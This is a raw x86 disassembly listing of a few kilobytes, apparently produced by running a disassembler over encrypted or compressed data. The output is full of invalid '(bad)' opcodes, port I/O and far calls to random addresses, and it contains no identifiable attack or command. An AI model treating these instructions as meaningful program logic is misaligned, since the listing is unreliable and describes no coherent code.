  418900:	icebp  
  418901:	pop    es
  418902:	push   esi
  418903:	xor    BYTE PTR [edi],0x84
  418906:	in     eax,dx
  418907:	adc    esp,DWORD PTR [eax+0xd]
  41890a:	shr    BYTE PTR [eax+0x5a822ab9],1
  418910:	mov    eax,0x1cc925e
  418915:	add    ch,BYTE PTR [eax+ebx*2]
  418918:	pop    esp
  418919:	shl    DWORD PTR [eax],0xb1
  41891c:	(bad)  
  41891d:	xchg   ebp,eax
  41891e:	adc    cl,BYTE PTR [eax-0xb]
  418921:	adc    al,0xdb
  418923:	mov    ds:0xe9378f68,eax
  418928:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418929:	push   ds
  41892a:	mov    DWORD PTR [eax+0x64],edx
  41892d:	int    0x26
  41892f:	push   esi
  418930:	data16 sbb BYTE PTR [ebp+0x13],0x4a
  418935:	pop    ecx
  418936:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418937:	cld    
  418938:	pop    esi
  418939:	ins    BYTE PTR es:[edi],dx
  41893a:	call   0x9a2b:0x9c940f15
  418941:	mov    eax,ds:0xe89c42f2
  418946:	aam    0x64
  418948:	daa    
  418949:	sub    edi,ecx
  41894b:	inc    ebx
  41894c:	into   
  41894d:	stos   DWORD PTR es:[edi],eax
  41894e:	lea    ebx,[ebp+0x60]
  418951:	xchg   edi,eax
  418952:	iret   
  418953:	(bad)  
  418954:	cmp    eax,0x7ef8aec2
  418959:	test   al,0x2c
  41895b:	test   eax,0x999a8cbb
  418960:	jne    0x418932
  418962:	dec    esi
  418963:	inc    ecx
  418964:	pop    esp
  418965:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418966:	cs xchg esp,eax
  418968:	leave  
  418969:	lds    edi,FWORD PTR [esi+0x54]
  41896c:	ds retf 0xaaaa
  418970:	leave  
  418971:	mov    DWORD PTR [edx],edx
  418973:	mov    al,ds:0xb0942356
  418978:	mov    ch,0x76
  41897a:	mov    esi,0x302718d
  41897f:	push   cs
  418980:	in     al,0xda
  418982:	ret    
  418983:	and    DWORD PTR [edi],0xffffffdb
  418986:	imul   edi,DWORD PTR [edi+0x1b6f3e8e],0x32
  41898d:	push   0xffffffeb
  41898f:	scas   al,BYTE PTR es:[edi]
  418990:	jp     0x418997
  418992:	das    
  418993:	aam    0xae
  418995:	in     al,dx
  418996:	or     bh,cl
  418998:	push   esi
  418999:	sbb    al,0x94
  41899b:	adc    BYTE PTR [ecx+0x6d],ch
  41899e:	mov    edx,0x74b1742c
  4189a3:	out    0x12,eax
  4189a5:	stos   BYTE PTR es:[edi],al
  4189a6:	nop
  4189a7:	jle    0x4189a9
  4189a9:	jle    0x4189ea
  4189ab:	fwait
  4189ac:	xchg   edx,eax
  4189ad:	cmc    
  4189ae:	aam    0xb5
  4189b0:	add    eax,0x32b9617c
  4189b5:	inc    ebp
  4189b6:	jmp    0x8512:0xbcc11cce
  4189bd:	lds    edx,FWORD PTR [ebx+0x41]
  4189c0:	daa    
  4189c1:	outs   dx,BYTE PTR ds:[esi]
	...
  418a32:	add    BYTE PTR [eax],al
  418a34:	das    
  418a35:	stos   DWORD PTR es:[edi],eax
  418a36:	cdq    
  418a37:	inc    ecx
  418a38:	popf   
  418a39:	jae    0x418a3a
  418a3b:	out    dx,eax
  418a3c:	inc    esp
  418a3d:	dec    edi
  418a3e:	(bad)  
  418a3f:	clc    
  418a40:	mov    ah,0x7f
  418a42:	out    dx,eax
  418a43:	stos   BYTE PTR es:[edi],al
  418a44:	cld    
  418a45:	or     eax,DWORD PTR [ecx]
  418a47:	add    dh,dh
  418a49:	add    BYTE PTR [eax],al
  418a4b:	add    BYTE PTR [edi],dh
  418a4d:	dec    eax
  418a4e:	fs push es
  418a50:	outs   dx,DWORD PTR ds:[esi]
  418a51:	adc    esp,DWORD PTR [ecx+0x62]
  418a54:	jne    0x418a83
  418a56:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418a57:	or     dl,al
  418a59:	xor    al,0xfa
  418a5b:	add    eax,0x441d988a
  418a60:	push   cs
  418a61:	or     ch,BYTE PTR [edx]
  418a63:	add    dh,ch
  418a65:	mov    edi,ebp
  418a67:	inc    ecx
  418a68:	jb     0x418a44
  418a6a:	pop    esi
  418a6b:	jg     0x418ae1
  418a6d:	mov    dl,BYTE PTR [edx+eiz*2+0x13]
  418a71:	call   0x888df9db
  418a76:	lock (bad) 
  418a78:	push   0xffffffaf
  418a7a:	dec    edi
  418a7b:	ins    BYTE PTR es:[edi],dx
  418a7c:	in     eax,0x90
  418a7e:	les    edi,FWORD PTR [edi-0x3332b5e3]
  418a84:	call   0xa971f885
  418a89:	push   esi
  418a8a:	fisubr WORD PTR [eax]
  418a8c:	aad    0x45
  418a8e:	mov    ch,BYTE PTR [esi+0x77eff069]
  418a94:	push   edi
  418a95:	xor    DWORD PTR [ecx+0x3c801666],0x93807f0b
  418a9f:	daa    
  418aa0:	addr16 jnp 0x418a5d
  418aa3:	inc    eax
  418aa4:	pusha  
  418aa5:	and    BYTE PTR [ebx+ebp*8],bh
  418aa8:	sbb    BYTE PTR [eax-0x31],bl
  418aab:	loop   0x418aab
  418aad:	loopne 0x418af4
  418aaf:	nop
  418ab0:	into   
  418ab1:	dec    esp
  418ab2:	cmp    al,0x86
  418ab4:	test   BYTE PTR [ebx+0x31],al
  418ab7:	ins    DWORD PTR es:[edi],dx
  418ab8:	and    al,0x7b
  418aba:	faddp  st(3),st
  418abc:	scas   al,BYTE PTR es:[edi]
  418abd:	add    ch,BYTE PTR [edx-0x78b5c1b3]
  418ac3:	outs   dx,DWORD PTR ds:[esi]
  418ac4:	loope  0x418a70
  418ac6:	frstor [ecx]
  418ac8:	sub    BYTE PTR [esi+0x2e71bef6],0xea
  418acf:	dec    edi
  418ad0:	mul    eax
  418ad2:	cmp    ecx,DWORD PTR [eax+0x32]
  418ad5:	int3   
  418ad6:	dec    eax
  418ad7:	pop    es
  418ad8:	mov    ah,0xab
  418ada:	imul   DWORD PTR gs:[ebp+0x6a34384f]
  418ae1:	into   
  418ae2:	add    bh,BYTE PTR [esi+0x7f]
  418ae5:	in     al,0xd4
  418ae7:	jno    0x418b15
  418ae9:	pop    ecx
  418aea:	jae    0x418b43
  418aec:	jp     0x418a75
  418aee:	pushf  
  418aef:	icebp  
  418af0:	and    DWORD PTR [ebx-0x43],ecx
  418af3:	imul   edi,eax,0xffffff91
  418af6:	xchg   edi,eax
  418af7:	into   
  418af8:	cmp    cl,BYTE PTR [edx]
  418afa:	or     DWORD PTR [edx],esp
  418afc:	in     eax,0xf0
  418afe:	jg     0x418b3a
  418b00:	lods   eax,DWORD PTR ds:[esi]
  418b01:	or     bh,ch
  418b03:	std    
  418b04:	adc    al,0xd4
  418b06:	pop    esi
  418b07:	adc    al,0xca
  418b09:	add    ch,bl
  418b0b:	pop    eax
  418b0c:	mov    dh,0xa0
  418b0e:	call   0x23be7e63
  418b13:	push   edx
  418b14:	(bad)  
  418b15:	sub    eax,0xae852d1d
  418b1a:	shr    BYTE PTR [eax-0x1eb6e10d],0xa3
  418b21:	xor    eax,ecx
  418b23:	rol    BYTE PTR [eax+0x58],cl
  418b26:	ret    
  418b27:	out    dx,al
  418b28:	mov    bl,0x75
  418b2a:	inc    BYTE PTR [edx]
  418b2c:	lock sbb al,0x1e
  418b2f:	nop
  418b30:	and    edx,DWORD PTR [ebx]
  418b32:	mov    ah,0xbc
  418b34:	scas   eax,DWORD PTR es:[edi]
  418b35:	jo     0x418b2f
  418b37:	imul   edi,edx,0xa4d42e96
  418b3d:	inc    ecx
  418b3e:	cmp    ch,ch
  418b40:	mov    WORD PTR [esi+0x0],es
	...
  418bb2:	add    BYTE PTR [eax],al
  418bb4:	mov    eax,eax
  418bb6:	nop
  418bb7:	test   cl,bl
  418bb9:	aam    0x9d
  418bbb:	int    0x19
  418bbd:	xchg   edx,eax
  418bbe:	clc    
  418bbf:	(bad)  
  418bc0:	fwait
  418bc1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418bc2:	icebp  
  418bc3:	add    edx,esi
  418bc5:	or     al,0x1
  418bc7:	add    dh,dh
  418bc9:	add    BYTE PTR [eax],al
  418bcb:	add    BYTE PTR [ecx],bh
  418bcd:	and    ebp,DWORD PTR [ebx-0x76]
  418bd0:	sub    BYTE PTR gs:[ebx],0x8
  418bd4:	mov    dl,BYTE PTR [esi+0xe]
  418bd7:	mov    bh,0x73
  418bd9:	cwde   
  418bda:	xor    BYTE PTR [edx-0x418a59cc],0xba
  418be1:	xor    BYTE PTR [ecx-0x7eb68e42],dh
  418be7:	and    eax,0x17294ece
  418bec:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418bed:	scas   al,BYTE PTR es:[edi]
  418bee:	arpl   WORD PTR [ebx-0x80],di
  418bf1:	(bad)  
  418bf2:	adc    BYTE PTR [esi-0x3e],dl
  418bf5:	inc    edx
  418bf6:	pop    ebx
  418bf7:	cmp    DWORD PTR [edx-0x74b4cc79],eax
  418bfd:	jge    0x418ba0
  418bff:	cs out dx,eax
  418c01:	mov    al,ds:0x85cdb679
  418c06:	mov    al,ds:0xfe6387d8
  418c0b:	jo     0x418b8f
  418c0d:	xchg   ecx,eax
  418c0e:	jns    0x418bec
  418c10:	add    DWORD PTR [edi+0x32],0xe1e99af9
  418c17:	push   ebx
  418c18:	fistp  WORD PTR [edx]
  418c1a:	xor    al,cl
  418c1c:	retf   
  418c1d:	xchg   edx,eax
  418c1e:	jmp    0x551bacf8
  418c23:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418c24:	dec    ebp
  418c25:	iret   
  418c26:	mov    ds:0x7032594b,eax
  418c2b:	adc    eax,0xb5544025
  418c30:	dec    ecx
  418c31:	nop
  418c32:	xor    DWORD PTR [ebp+0xf3eddc1],esp
  418c38:	fimul  WORD PTR [eax+0x3b66ed35]
  418c3e:	imul   dh
  418c40:	mov    ss,WORD PTR [ebp-0x29a150f9]
  418c46:	(bad)  
  418c47:	xchg   ebp,eax
  418c48:	call   0xcf74b8ff
  418c4d:	and    al,BYTE PTR [edx+0x7f]
  418c50:	adc    al,0x2
  418c52:	mov    WORD PTR [edx+0x4c],?
  418c55:	daa    
  418c56:	sahf   
  418c57:	int    0xf3
  418c59:	scas   al,BYTE PTR es:[edi]
  418c5a:	aas    
  418c5b:	ror    ecx,cl
  418c5d:	dec    ebx
  418c5e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418c5f:	arpl   WORD PTR [edi+0x2d],dx
  418c62:	test   cl,bl
  418c64:	es pop esp
  418c66:	mov    WORD PTR [ebp+eiz*4-0x49],cs
  418c6a:	in     eax,dx
  418c6b:	mov    esi,0xb91c0b11
  418c70:	or     DWORD PTR [ecx+0x46],edi
  418c73:	or     DWORD PTR [edi+0x24],esi
  418c76:	push   ecx
  418c77:	(bad)  
  418c78:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418c79:	cwde   
  418c7a:	mov    DWORD PTR [ebp-0x5d],ebx
  418c7d:	fstp   DWORD PTR ds:0xe5b81c66
  418c83:	std    
  418c84:	(bad)  
  418c86:	ja     0x418ca0
  418c88:	lock inc ebp
  418c8a:	sub    eax,0x66d5281f
  418c8f:	repz jae 0x418c1e
  418c92:	jno    0x418c67
  418c94:	jle    0x418c75
  418c96:	gs cdq 
  418c98:	sub    BYTE PTR [edx],ah
  418c9a:	es dec ecx
  418c9c:	ins    BYTE PTR es:[edi],dx
  418c9d:	dec    eax
  418c9e:	push   ds
  418c9f:	push   esp
  418ca0:	push   edi
  418ca1:	fcmovnb st,st(6)
  418ca3:	or     al,0x43
  418ca5:	(bad)  
  418ca6:	mov    ch,0x3f
  418ca8:	or     esi,DWORD PTR [eax]
  418caa:	dec    eax
  418cab:	ja     0x418cd9
  418cad:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418cae:	pusha  
  418caf:	mov    ah,0x9
  418cb1:	jmp    0x2e3d:0x9999ed3b
  418cb8:	retf   0x7755
  418cbb:	sti    
  418cbc:	xchg   edx,eax
  418cbd:	dec    ebx
  418cbe:	xlat   BYTE PTR fs:[ebx]
  418cc0:	test   eax,0x46
	...
  418d31:	add    BYTE PTR [eax],al
  418d33:	add    BYTE PTR [edi],dl
  418d35:	arpl   WORD PTR ds:0x5f7f7d53,bx
  418d3b:	addr16 in eax,dx
  418d3d:	inc    eax
  418d3e:	jmp    0x447d6961
  418d43:	pop    es
  418d44:	call   0xf6418e56
  418d49:	add    BYTE PTR [eax],al
  418d4b:	add    BYTE PTR ds:0x8514f2fa,ah
  418d51:	add    dl,bl
  418d53:	xor    al,0x98
  418d55:	push   ebx
  418d56:	dec    ebp
  418d57:	aaa    
  418d58:	retf   0x1401
  418d5b:	cmp    BYTE PTR [ebx-0x29],dh
  418d5e:	jmp    0xa2681515
  418d63:	push   0x56
  418d65:	push   ss
  418d66:	test   BYTE PTR [ebx-0x2],0xe6
  418d6a:	xor    al,0x16
  418d6c:	adc    DWORD PTR [edx-0x5],ecx
  418d6f:	inc    eax
  418d70:	mov    al,ds:0xe113d7e2
  418d75:	mov    eax,0x2b832ec4
  418d7a:	test   eax,0xbaad8637
  418d7f:	in     eax,dx
  418d80:	(bad)  
  418d81:	test   eax,0x95820726
  418d86:	(bad)  
  418d87:	cmp    BYTE PTR [ebp-0x76],ch
  418d8a:	and    edx,edi
  418d8c:	mov    al,ds:0x1dae398e
  418d91:	cmp    ah,BYTE PTR [ecx]
  418d93:	sub    DWORD PTR [ebx],0xdae83278
  418d99:	(bad)  
  418d9a:	in     al,dx
  418d9b:	mov    ax,0xda00
  418d9f:	and    DWORD PTR [ebx],esp
  418da1:	add    DWORD PTR [edx+edi*8],ecx
  418da4:	push   esi
  418da5:	aam    0xfa
  418da7:	adc    al,0xcd
  418da9:	int3   
  418daa:	scas   eax,DWORD PTR es:[edi]
  418dab:	lods   eax,DWORD PTR ds:[esi]
  418dac:	dec    esi
  418dad:	and    BYTE PTR [edi+ebp*4],0x5c
  418db1:	xor    ah,BYTE PTR [ebx-0x5030d5e7]
  418db7:	ja     0x418dc5
  418db9:	out    dx,al
  418dba:	test   BYTE PTR [eax],al
  418dbc:	inc    ecx
  418dbd:	ss mov ebp,0xbe86a0d0
  418dc3:	aad    0xb
  418dc5:	(bad)  
  418dc6:	and    bl,BYTE PTR [ecx]
  418dc8:	sub    bh,al
  418dca:	dec    edx
  418dcb:	sahf   
  418dcc:	pop    edi
  418dcd:	xchg   ebx,eax
  418dce:	or     esi,edi
  418dd0:	cmp    cl,ah
  418dd2:	stos   BYTE PTR es:[edi],al
  418dd3:	add    edx,ecx
  418dd5:	sub    DWORD PTR [ebp+0x2da3f36f],0x33
  418ddc:	push   edi
  418ddd:	sub    esi,esp
  418ddf:	in     eax,0x43
  418de1:	jg     0x418d97
  418de3:	xor    al,0xcb
  418de5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418de6:	adc    cl,al
  418de8:	and    BYTE PTR [edx+0x5a0b47eb],ah
  418dee:	aaa    
  418def:	ins    BYTE PTR es:[edi],dx
  418df0:	jae    0x418d79
  418df2:	mov    al,0x78
  418df4:	xchg   ah,dl
  418df6:	rcl    DWORD PTR [edx+0x38fa22ad],1
  418dfc:	test   eax,0xc3ce2ff2
  418e01:	and    esi,eax
  418e03:	fiadd  DWORD PTR [eax-0x634c968]
  418e09:	loopne 0x418e2d
  418e0b:	xor    eax,0x9f76da92
  418e10:	mov    WORD PTR ds:0x4cd30675,ss
  418e16:	pop    ds
  418e17:	out    dx,al
  418e18:	fist   DWORD PTR [edx]
  418e1a:	por    mm7,mm5
  418e1d:	push   edx
  418e1e:	retf   0x745d
  418e21:	cli    
  418e22:	jno    0x418e64
  418e24:	push   es
  418e25:	xor    bl,BYTE PTR [esi]
  418e27:	test   al,0xc
  418e29:	mov    edx,0x68f3b9cf
  418e2e:	ja     0x418de2
  418e30:	jecxz  0x418e47
  418e32:	repz jg 0x418e09
  418e35:	inc    edi
  418e36:	(bad)  
  418e37:	ficomp WORD PTR [ecx+0x6f]
  418e3a:	push   ecx
  418e3b:	xchg   ebx,eax
  418e3c:	cmp    al,0x34
  418e3e:	add    eax,0x9f3b23
	...
  418eb3:	add    BYTE PTR [edx-0x1a],ah
  418eb6:	out    0x3b,al
  418eb8:	out    0x3b,al
  418eba:	(bad)  
  418ebb:	push   DWORD PTR [eax-0x20]
  418ebe:	jecxz  0x418eb9
  418ec0:	inc    esp
  418ec1:	dec    edi
  418ec2:	ret    
  418ec3:	adc    al,0xde
  418ec5:	push   cs
  418ec6:	add    DWORD PTR [eax],eax
  418ec8:	test   BYTE PTR [eax],0x0
  418ecb:	add    BYTE PTR [ebx-0x65],ch
  418ece:	(bad)  
  418ecf:	cmc    
  418ed0:	jo     0x418eb0
  418ed2:	scas   eax,DWORD PTR es:[edi]
  418ed3:	leave  
  418ed4:	test   DWORD PTR [ebx+0x42ce416d],edx
  418eda:	push   es
  418edb:	sbb    dl,BYTE PTR [eax-0x32]
  418ede:	pusha  
  418edf:	es and esi,DWORD PTR cs:[ebp-0x59]
  418ee4:	mov    ebx,0x19729712
  418ee9:	pop    ds
  418eea:	iret   
  418eeb:	sbb    ah,al
  418eed:	mov    bl,0xd5
  418eef:	pop    ds
  418ef0:	push   ecx
  418ef1:	mov    al,ds:0x1a28447b
  418ef6:	mov    ah,BYTE PTR [edx]
  418ef8:	xchg   ecx,eax
  418ef9:	shr    DWORD PTR [ebx+0x1911f29],cl
  418eff:	cmp    al,0x3c
  418f01:	jo     0x418ef2
  418f03:	(bad)  
  418f04:	out    0x72,al
  418f06:	and    dh,BYTE PTR [ebx-0x76]
  418f09:	arpl   si,di
  418f0b:	pop    ecx
  418f0c:	and    DWORD PTR [edx],eax
  418f0e:	fisttp DWORD PTR [esi+0x31]
  418f11:	adc    ecx,DWORD PTR [ebx+0x4c02d65f]
  418f17:	stos   DWORD PTR es:[edi],eax
  418f18:	pop    es
  418f19:	xor    al,0x68
  418f1b:	mov    bh,0x1a
  418f1d:	out    0xb9,eax
  418f1f:	mov    dl,bh
  418f21:	fld    TBYTE PTR [ecx-0x18]
  418f24:	jge    0x418f3e
  418f26:	xchg   edi,eax
  418f27:	call   0xf034:0xc887121e
  418f2e:	scas   al,BYTE PTR es:[edi]
  418f2f:	xor    DWORD PTR [ebp-0x71],esp
  418f32:	inc    edx
  418f33:	xor    dh,ah
  418f35:	mov    ebx,esp
  418f37:	push   ss
  418f38:	das    
  418f39:	sub    DWORD PTR [esp+esi*8-0x22],eax
  418f3d:	cwde   
  418f3e:	push   ss
  418f3f:	aam    0x47
  418f41:	mov    es,WORD PTR ds:0x67c3a3f6
  418f47:	in     eax,0x98
  418f49:	outs   dx,BYTE PTR ds:[esi]
  418f4a:	fwait
  418f4b:	and    eax,0xad50b443
  418f50:	jmp    0xfd38:0x9ce5d951
  418f57:	pop    edx
  418f58:	jmp    0xacef:0x4d16f7d7
  418f5f:	loop   0x418f81
  418f61:	das    
  418f62:	and    esi,DWORD PTR [ebp-0x1f]
  418f65:	xchg   DWORD PTR ds:[edx+0x59],eax
  418f69:	xor    esp,0x40d4146f
  418f6f:	xchg   edx,eax
  418f70:	outs   dx,BYTE PTR ds:[esi]
  418f71:	sub    BYTE PTR [edi],dl
  418f73:	retf   0xa223
  418f76:	jbe    0x418fc1
  418f78:	scas   al,BYTE PTR es:[edi]
  418f79:	cli    
  418f7a:	int3   
  418f7b:	jno    0x418fb6
  418f7d:	pop    edx
  418f7e:	mov    eax,ebp
  418f80:	aas    
  418f81:	xor    eax,0x6f2e541e
  418f86:	in     eax,0xef
  418f88:	leave  
  418f89:	sbb    ebp,DWORD PTR ds:[edx+0x18]
  418f8d:	add    esi,esi
  418f8f:	push   edi
  418f90:	out    0xe1,eax
  418f92:	mov    eax,ds:0xccff84c6
  418f97:	push   ecx
  418f98:	stc    
  418f99:	inc    ebp
  418f9a:	xchg   esi,eax
  418f9b:	retf   0xdd91
  418f9e:	pop    ebx
  418f9f:	fild   DWORD PTR [eax]
  418fa1:	mov    eax,0x307af84e
  418fa6:	xlat   BYTE PTR ds:[ebx]
  418fa7:	loope  0x418f40
  418fa9:	repnz aad 0xb4
  418fac:	mov    esi,0xaf8d743b
  418fb1:	jl     0x419026
  418fb3:	or     al,0x3c
  418fb5:	jl     0x418fe9
  418fb7:	and    BYTE PTR [eax+edx*4+0x6d],0xe1
  418fbc:	pop    es
  418fbd:	add    al,0x6f
  418fbf:	cwde   
  418fc0:	push   edx
  418fc1:	xchg   BYTE PTR [eax],al
	...
  419033:	add    BYTE PTR [ecx-0xba9482],ch
  419039:	push   ebp
  41903a:	scas   eax,DWORD PTR es:[edi]
  41903b:	(bad)  
  41903c:	out    dx,eax
  41903d:	mov    ch,0xb6
  41903f:	ror    BYTE PTR [edx-0x2b41edb7],cl
  419045:	sgdtd  [eax]
  419048:	test   BYTE PTR [eax],0x0
  41904b:	add    bh,ch
  41904d:	hlt    
  41904e:	gs xchg ebx,eax
  419050:	mov    ebp,ebx
  419052:	sbb    al,0x37
  419054:	jle    0x418fe8
  419056:	ficom  DWORD PTR [esi+0x30]
  419059:	sbb    DWORD PTR [ecx],0x70
  41905c:	shl    BYTE PTR [edx-0x152318c3],0x28
  419063:	mov    bx,0x1281
  419067:	ins    DWORD PTR es:[edi],dx
  419068:	xor    bh,ah
  41906a:	nop
  41906b:	in     al,0x14
  41906d:	retf   0xdf4f
  419070:	sub    al,0x96
  419072:	popf   
  419073:	push   eax
  419074:	pop    ebx
  419075:	mov    esi,DWORD PTR es:[ecx-0x40]
  419079:	inc    ebx
  41907a:	jne    0x41900d
  41907c:	sub    bh,ah
  41907e:	mov    WORD PTR [esi],?
  419080:	jo     0x41905d
  419082:	jg     0x41903e
  419084:	jg     0x41906e
  419086:	xchg   ecx,eax
  419087:	int3   
  419088:	dec    ebp
  419089:	push   0xffffff8e
  41908b:	inc    edx
  41908c:	data16 and al,0xa6
  41908f:	fwait
  419090:	retf   0xa400
  419093:	and    eax,0x8f262d46
  419098:	cwde   
  419099:	repz ss repnz push eax
  41909d:	je     0x41902b
  41909f:	mov    ah,0xd1
  4190a1:	pop    ds
  4190a2:	xchg   ecx,eax
  4190a3:	inc    ebx
  4190a4:	cmp    ch,ch
  4190a6:	mov    edi,0x3860c939
  4190ab:	adc    eax,0x22aa1e45
  4190b0:	pushf  
  4190b1:	add    eax,0xea7b388a
  4190b6:	mov    ecx,0x75fe9ec4
  4190bb:	cmp    cl,BYTE PTR [edi+edx*1+0x33]
  4190bf:	fadd   DWORD PTR [eax]
  4190c1:	pop    ecx
  4190c2:	mov    al,ds:0x9819bb9e
  4190c7:	push   eax
  4190c8:	call   0xd9c6:0x27ba6bb5
  4190cf:	push   edi
  4190d0:	adc    bh,BYTE PTR [edi-0xb]
  4190d3:	stc    
  4190d4:	push   ecx
  4190d5:	test   DWORD PTR [ecx+0x23a5dbc4],eax
  4190db:	inc    ebp
  4190dc:	push   cs
  4190dd:	xchg   edx,eax
  4190de:	sbb    BYTE PTR [edx-0x26],0x81
  4190e2:	imul   ebp,edi,0x43
  4190e5:	inc    edi
  4190e6:	jne    0x41912c
  4190e8:	add    ebx,edx
  4190ea:	jnp    0x4190ba
  4190ec:	xchg   edi,eax
  4190ed:	cmp    eax,DWORD PTR [ebx]
  4190ef:	out    dx,eax
  4190f0:	mov    al,ds:0xcac9aeeb
  4190f5:	pop    ecx
  4190f6:	jb     0x4190fe
  4190f8:	scas   al,BYTE PTR es:[edi]
  4190f9:	mov    dh,0x5b
  4190fb:	(bad)  
  4190fc:	in     al,dx
  4190fd:	push   cs
  4190fe:	lahf   
  4190ff:	and    DWORD PTR [eax+0x1b],edi
  419102:	rcl    BYTE PTR [ebp-0x78b91550],cl
  419108:	hlt    
  419109:	add    DWORD PTR [esi-0x38817add],esp
  41910f:	fwait
  419110:	pop    ebp
  419111:	pop    ss
  419112:	call   0x6e95:0x3a54a4b8
  419119:	in     al,0xc2
  41911b:	inc    ebp
  41911c:	sbb    eax,0x7372a838
  419121:	(bad)  [ecx]
  419123:	inc    DWORD PTR [edi]
  419125:	outs   dx,BYTE PTR ds:[esi]
  419126:	int3   
  419127:	fadd   DWORD PTR [edi]
  419129:	fs adc al,0x94
  41912c:	(bad)  
  41912d:	xor    DWORD PTR [edi+0x21],esp
  419130:	aam    0xdc
  419132:	call   0x6042:0x2f7dd639
  419139:	out    dx,eax
  41913a:	dec    ecx
  41913b:	pop    edx
  41913c:	into   
  41913d:	or     bh,BYTE PTR [ecx]
  41913f:	adc    DWORD PTR [edx+0xd3],ecx
	...
  4191b1:	add    BYTE PTR [eax],al
  4191b3:	add    BYTE PTR [edi],dh
  4191b5:	xchg   edx,eax
  4191b6:	and    al,0x83
  4191b8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4191b9:	mov    bh,0xb7
  4191bb:	mov    dh,0xb3
  4191bd:	cmp    al,0x9b
  4191bf:	scas   eax,DWORD PTR es:[edi]
  4191c0:	pop    ss
  4191c1:	jl     0x4191ad
  4191c3:	popf   
  4191c4:	retf   0x110
  4191c7:	add    dh,dh
  4191c9:	add    BYTE PTR [eax],al
  4191cb:	add    BYTE PTR [ebx+esi*2-0x44fd899b],bh
  4191d2:	push   esi
  4191d3:	cmp    bl,BYTE PTR [esi+edi*1]
  4191d6:	hlt    
  4191d7:	mov    edi,0xbe9a3ba5
  4191dc:	(bad)  
  4191dd:	imul   edx,DWORD PTR [ebp+0x26],0xc403f9c0
  4191e4:	push   edi
  4191e5:	cmp    al,0xb
  4191e7:	into   
  4191e8:	or     esi,edi
  4191ea:	iret   
  4191eb:	jle    0x41917c
  4191ed:	outs   dx,BYTE PTR ds:[esi]
  4191ee:	sub    DWORD PTR [ecx+0x61],ebx
  4191f1:	mov    esi,0x346c0bc7
  4191f6:	cld    
  4191f7:	mov    dl,0xfc
  4191f9:	push   ebx
  4191fa:	xchg   DWORD PTR [esi+0x72],eax
  4191fd:	rcr    BYTE PTR [edi],cl
  4191ff:	aas    
  419200:	sbb    al,0x8a
  419202:	and    eax,0xe4040fa7
  419207:	xchg   esp,eax
  419208:	mov    DWORD PTR [edi],0xa249c6d0
  41920e:	jnp    0x41923a
  419210:	aas    
  419211:	out    0x16,al
  419213:	sbb    edi,DWORD PTR [edx-0xd]
  419216:	clc    
  419217:	push   cs
  419218:	xchg   BYTE PTR [edi-0x610028a4],ch
  41921e:	xchg   ecx,eax
  41921f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419220:	mov    dh,0xe8
  419222:	adc    eax,DWORD PTR ds:0x775cad9a
  419228:	mov    dh,ch
  41922a:	sub    eax,0x31deb878
  41922f:	adc    edi,DWORD PTR [ebp-0x6bcc0784]
  419235:	hlt    
  419236:	sub    ch,BYTE PTR [ebx+0x67]
  419239:	push   ss
  41923a:	push   cs
  41923b:	inc    BYTE PTR [ecx-0x523b2f88]
  419241:	push   ds
  419242:	jg     0x41926e
  419244:	fisub  DWORD PTR [ebx-0x73]
  419247:	mov    edi,0x4b9e88d1
  41924c:	push   ecx
  41924d:	jmp    0x4192a4
  41924f:	mov    ah,bl
  419251:	in     al,0xf9
  419253:	sbb    DWORD PTR [eax+0x22],esp
  419256:	mov    ebx,0x368682b5
  41925b:	cs jne 0x4192ba
  41925e:	mov    BYTE PTR [ebp-0x3e68a2cc],cl
  419264:	dec    edx
  419265:	pusha  
  419266:	jno    0x419238
  419268:	jmp    0x419229
  41926a:	mov    eax,0x1a1d1813
  41926f:	push   es
  419270:	adc    DWORD PTR [esi+edi*1-0x64],ecx
  419274:	(bad)  
  419276:	or     al,0x89
  419278:	inc    ecx
  419279:	pop    ebx
  41927a:	ss add eax,0x4fefaf13
  419280:	outs   dx,DWORD PTR ds:[esi]
  419281:	(bad)  
  419283:	and    al,0x8e
  419285:	xchg   ebp,eax
  419286:	lahf   
  419287:	pop    esi
  419288:	inc    esi
  419289:	cs aam 0x46
  41928c:	mov    al,ds:0x2500a986
  419291:	lods   al,BYTE PTR ds:[esi]
  419292:	das    
  419293:	and    DWORD PTR [esi],edi
  419295:	adc    DWORD PTR [ecx],edi
  419297:	gs repnz stc 
  41929a:	inc    edi
  41929b:	mov    BYTE PTR [ebp+eax*1+0x7cce0b66],cl
  4192a2:	int    0x78
  4192a4:	ret    
  4192a5:	push   ebx
  4192a6:	jp     0x4192cc
  4192a8:	pushf  
  4192a9:	bnd jae 0x41922f
  4192ac:	inc    eax
  4192ad:	mov    cl,0xb0
  4192af:	xor    ebx,DWORD PTR [eax-0x6e]
  4192b2:	push   ebp
  4192b3:	inc    edi
  4192b4:	add    BYTE PTR [ecx+ecx*2],0xb5
  4192b8:	cmp    al,0x73
  4192ba:	rcl    ebp,1
  4192bc:	cmc    
  4192bd:	call   0x0:0xc66e41ea
	...
  419334:	fdiv   QWORD PTR [ebx-0x2380afc1]
  41933a:	(bad)  
  41933b:	mov    edi,0xbcd03e15
  419340:	fdiv   DWORD PTR [eax+0x11c0d293]
  419346:	add    DWORD PTR [eax],eax
  419348:	test   BYTE PTR [eax],0x0
  41934b:	add    bh,cl
  41934d:	push   esi
  41934e:	or     edi,DWORD PTR [edx]
  419350:	push   edi
  419351:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419352:	cwde   
  419353:	inc    esp
  419354:	out    dx,al
  419355:	mov    ch,bh
  419357:	jle    0x41932d
  419359:	or     esp,DWORD PTR [ecx+0x4f384ffa]
  41935f:	(bad)  
  419360:	sbb    eax,0x98276e4
  419365:	sub    ecx,DWORD PTR [esi-0x96a3aed]
  41936b:	jle    0x419369
  41936d:	into   
  41936e:	dec    ebx
